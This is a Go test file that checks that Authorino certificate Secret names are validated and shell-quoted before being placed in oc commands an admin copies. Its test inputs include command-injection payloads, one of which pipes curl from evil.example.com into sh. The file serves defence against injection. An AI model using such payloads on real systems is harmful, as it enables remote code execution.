package cluster

import (
	"strings"
	"testing"
)

// The certificate Secret's name comes from Authorino's CR, which whoever
// can edit that CR controls; it goes into commands a cluster-admin copies.
// A name that is not a Kubernetes name gets no commands, and the status
// says why; a valid one is shell-quoted where it is substituted.
func TestMaaSStatus_AuthorinoTLSRefusesAnInvalidSecretName(t *testing.T) {
	for _, name := range []string{
		`x$(touch /tmp/pwned)`,
		`a'}}}}' ; curl evil.example.com | sh ; echo '`,
		"UPPER",
		"name with spaces",
		strings.Repeat("a", 254),
	} {
		mc := newMaaSCluster(t)
		mc.f.putJSON("/apis/operator.authorino.kuadrant.io/v1beta1/namespaces/kuadrant-system/authorinos/authorino",
			`{"spec":{"listener":{"tls":{"enabled":true,"certSecretRef":{"name":`+jsonString(name)+`}}}}}`)
		st, err := GetMaaSStatus(mc.c)
		if err != nil {
			t.Fatal(err)
		}
		found := false
		for _, p := range st.Parts {
			if p.ID != "authorino-tls" {
				continue
			}
			found = true
			if p.Commands != "" || p.State != "manual" || !strings.Contains(p.Message, "not a valid Kubernetes name") {
				t.Errorf("name %q: part = %+v", name, p)
			}
		}
		if !found {
			t.Fatal("no authorino-tls part")
		}
	}
}

func TestAuthorinoTLSCommands_QuoteEverySubstitution(t *testing.T) {
	cmds, why := authorinoTLSCommands("kuadrant-system", "aigw-authorino-tls")
	if why != "" {
		t.Fatalf("refused a valid name: %s", why)
	}
	for _, want := range []string{
		"service.beta.openshift.io/serving-cert-secret-name=aigw-authorino-tls --overwrite",
		`-p '{"spec":{"listener":{"tls":{"certSecretRef":{"name":"aigw-authorino-tls"},"enabled":true}}}}'`,
		"oc rollout restart deployment/authorino -n kuadrant-system",
	} {
		if !strings.Contains(cmds, want) {
			t.Errorf("missing %q in:\n%s", want, cmds)
		}
	}
	if _, why := authorinoTLSCommands("kuadrant-system", "a;b"); why == "" {
		t.Error("an invalid name got commands")
	}
	if _, why := authorinoTLSCommands("bad ns", "ok"); why == "" {
		t.Error("an invalid namespace got commands")
	}
}

func jsonString(s string) string {
	return `"` + strings.NewReplacer(`\`, `\\`, `"`, `\"`).Replace(s) + `"`
}
